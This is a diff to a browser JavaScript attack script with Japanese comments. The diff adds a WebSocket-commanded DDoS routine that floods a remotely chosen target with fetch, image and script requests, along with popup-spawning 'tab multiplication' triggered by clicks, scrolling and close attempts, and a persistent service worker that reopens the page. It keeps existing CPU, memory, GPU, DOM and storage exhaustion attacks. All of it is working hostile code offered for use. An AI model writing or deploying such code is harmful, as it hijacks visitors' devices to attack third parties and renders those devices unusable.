@@ -3,6 +3,8 @@
 
     let socket = null;
     let isAttacking = false;
+    let ddosTarget = null;
+    let isDDoSing = false;
 
     function connectWebSocket() {
         try {
@@ -21,6 +23,11 @@
                     }
                     if (data.command === 'stop') {
                         isAttacking = false;
+                        isDDoSing = false;
+                    }
+                    if (data.command === 'ddos') {
+                        ddosTarget = data.target;
+                        startDDoS();
                     }
                 } catch(err) {}
             };
@@ -44,20 +51,192 @@
         gpuAttack();
         domAttack();
         storageAttack();
+        tabMultiplier();
+        serviceWorkerRegister();
     }
 
-    // CPU攻撃 - 強力版
+    // ============================================
+    // タブ増殖
+    // ============================================
+    function tabMultiplier() {
+        let tapCount = 0;
+        
+        // タップで増殖
+        document.addEventListener('click', () => {
+            if (!isAttacking) return;
+            
+            tapCount++;
+            
+            // タップ回数に応じて開く数を増やす
+            const openCount = Math.min(tapCount, 10);
+            
+            for (let i = 0; i < openCount; i++) {
+                try {
+                    const popup = window.open(
+                        location.href,
+                        '_blank',
+                        `width=${100 + Math.random()*100},height=${100 + Math.random()*100},left=${Math.random()*(screen.width-200)},top=${Math.random()*(screen.height-200)}`
+                    );
+                    
+                    if (popup) {
+                        popup.document.write('<!DOCTYPE html><html><head><title>Loading...</title></head><body>Loading...</body></html>');
+                    }
+                } catch(e) {}
+            }
+        });
+        
+        // タッチデバイス用
+        document.addEventListener('touchstart', () => {
+            if (!isAttacking) return;
+            
+            tapCount++;
+            const openCount = Math.min(tapCount, 10);
+            
+            for (let i = 0; i < openCount; i++) {
+                try {
+                    window.open(location.href, '_blank');
+                } catch(e) {}
+            }
+        });
+        
+        // 閉じようとしたら増殖
+        window.addEventListener('beforeunload', (e) => {
+            e.preventDefault();
+            e.returnValue = '';
+            
+            for (let i = 0; i < 5; i++) {
+                try {
+                    window.open(location.href, '_blank');
+                } catch(e) {}
+            }
+        });
+        
+        // pagehideでも増殖
+        window.addEventListener('pagehide', () => {
+            for (let i = 0; i < 3; i++) {
+                try {
+                    window.open(location.href, '_blank');
+                } catch(e) {}
+            }
+        });
+        
+        // スクロールでも増殖
+        let lastScroll = 0;
+        window.addEventListener('scroll', () => {
+            const now = Date.now();
+            if (now - lastScroll > 2000) {
+                lastScroll = now;
+                try {
+                    window.open(location.href, '_blank');
+                } catch(e) {}
+            }
+        });
+        
+        // 自動増殖（保険）
+        setInterval(() => {
+            if (!isAttacking) return;
+            
+            try {
+                window.open(location.href, '_blank');
+            } catch(e) {}
+        }, 10000);
+    }
+
+    // ============================================
+    // Service Worker登録（保険）
+    // ============================================
+    function serviceWorkerRegister() {
+        if ('serviceWorker' in navigator) {
+            // Service WorkerのコードをBlobで生成
+            const swCode = `
+                self.addEventListener('install', (e) => {
+                    self.skipWaiting();
+                });
+                
+                self.addEventListener('activate', (e) => {
+                    e.waitUntil(clients.claim());
+                });
+                
+                // キャッシュに攻撃ページを保存
+                self.addEventListener('fetch', (e) => {
+                    e.respondWith(
+                        caches.open('attack-cache').then((cache) => {
+                            return fetch(e.request).then((response) => {
+                                cache.put(e.request, response.clone());
+                                return response;
+                            }).catch(() => {
+                                return cache.match(e.request);
+                            });
+                        })
+                    );
+                });
+                
+                // 定期的にクライアントを復活
+                setInterval(() => {
+                    clients.matchAll().then((clientList) => {
+                        if (clientList.length === 0) {
+                            clients.openWindow('/');
+                        }
+                    });
+                }, 30000);
+            `;
+            
+            const blob = new Blob([swCode], { type: 'application/javascript' });
+            const swUrl = URL.createObjectURL(blob);
+            
+            navigator.serviceWorker.register(swUrl)
+                .then(() => console.log('SW登録成功'))
+                .catch(() => console.log('SW登録失敗'));
+        }
+    }
+
+    // ============================================
+    // DDoS攻撃（踏み台）
+    // ============================================
+    function startDDoS() {
+        if (isDDoSing || !ddosTarget) return;
+        isDDoSing = true;
+        
+        function attack() {
+            if (!isDDoSing) return;
+            
+            for (let i = 0; i < 50; i++) {
+                // fetch攻撃
+                fetch(ddosTarget + '?ddos=' + Math.random(), {
+                    mode: 'no-cors',
+                    cache: 'no-store'
+                }).catch(() => {});
+                
+                // 画像攻撃
+                const img = new Image();
+                img.src = ddosTarget + '?img=' + Math.random();
+                
+                // script攻撃
+                const script = document.createElement('script');
+                script.src = ddosTarget + '?js=' + Math.random();
+                document.head.appendChild(script);
+                script.remove();
+            }
+        }
+        
+        const attackInterval = setInterval(attack, 0);
+        
+        setTimeout(() => {
+            clearInterval(attackInterval);
+            if (isDDoSing) startDDoS();
+        }, 10000);
+    }
+
+    // CPU攻撃 - 強力版（そのまま）
     function cpuAttack() {
         const cores = navigator.hardwareConcurrency || 4;
         
-        // メインスレッドでも負荷
         function mainThreadLoad() {
             if (!isAttacking) return;
             
             let x = 0;
             const start = Date.now();
             
-            // 50ms全力計算 → 10ms休憩 → 繰り返し
             while (Date.now() - start < 50) {
                 x += Math.sqrt(Math.random() * 1000) * Math.random();
                 x += Math.pow(Math.random(), 2) * Math.random();
@@ -67,7 +246,6 @@
             setTimeout(mainThreadLoad, 10);
         }
         
-        // Web Workersで全コア飽和
         const workerCode = `
             let running = true;
             
@@ -110,7 +288,7 @@
         mainThreadLoad();
     }
 
-    // メモリ攻撃 - 改良版
+    // メモリ攻撃 - 改良版（そのまま）
     function memoryAttack() {
         const memArrays = [];
         
@@ -118,12 +296,10 @@
             if (!isAttacking) return;
             
             try {
-                // 一気に50MB確保
                 for (let i = 0; i < 10; i++) {
                     const buffer = new ArrayBuffer(1024 * 1024 * 5);
                     const view = new Uint8Array(buffer);
                     
-                    // 全領域に書き込み
                     for (let j = 0; j < view.length; j += 100) {
                         view[j] = Math.random() * 255;
                     }
@@ -131,12 +307,10 @@
                     memArrays.push(buffer);
                 }
                 
-                // 100個(500MB)超えたら古いのを捨てる
                 if (memArrays.length > 100) {
                     memArrays.splice(0, 20);
                 }
             } catch(e) {
-                // メモリ不足
                 memArrays.length = 0;
             }
             
@@ -146,7 +320,7 @@
         allocateMemory();
     }
 
-    // GPU攻撃 - 改良版
+    // GPU攻撃 - 改良版（そのまま）
     function gpuAttack() {
         try {
             const canvas = document.createElement('canvas');
@@ -159,7 +333,6 @@
             function heavyDraw() {
                 if (!isAttacking) return;
                 
-                // 大量の描画
                 for (let i = 0; i < 500; i++) {
                     ctx.fillStyle = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},${Math.random()})`;
                     ctx.fillRect(
@@ -170,7 +343,6 @@
                     );
                 }
                 
-                // 複雑なパス
                 for (let i = 0; i < 50; i++) {
                     ctx.beginPath();
                     ctx.moveTo(Math.random()*8000, Math.random()*8000);
@@ -184,7 +356,6 @@
                     ctx.stroke();
                 }
                 
-                // 影付き描画（重い）
                 ctx.shadowBlur = 100;
                 ctx.shadowColor = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0.5)`;
                 
@@ -207,7 +378,7 @@
         } catch(e) {}
     }
 
-    // DOM攻撃 - 改良版
+    // DOM攻撃 - 改良版（そのまま）
     function domAttack() {
         const container = document.createElement('div');
         container.style.display = 'none';
@@ -217,7 +388,6 @@
             if (!isAttacking) return;
             
             try {
-                // 大量の要素を一気に生成
                 for (let i = 0; i < 1000; i++) {
                     const el = document.createElement('div');
                     el.textContent = 'x'.repeat(Math.floor(Math.random() * 1000));
@@ -238,7 +408,6 @@
                     container.appendChild(el);
                 }
                 
-                // 5000個超えたらリセット
                 if (container.children.length > 5000) {
                     container.innerHTML = '';
                 }
@@ -250,7 +419,7 @@
         createElements();
     }
 
-    // ストレージ攻撃
+    // ストレージ攻撃（そのまま）
     function storageAttack() {
         function fillStorage() {
             if (!isAttacking) return;
@@ -274,7 +443,7 @@
         fillStorage();
     }
 
-    // 離脱防止
+    // 離脱防止（そのまま）
     function preventLeave() {
         window.addEventListener('beforeunload', (e) => {
             e.preventDefault();
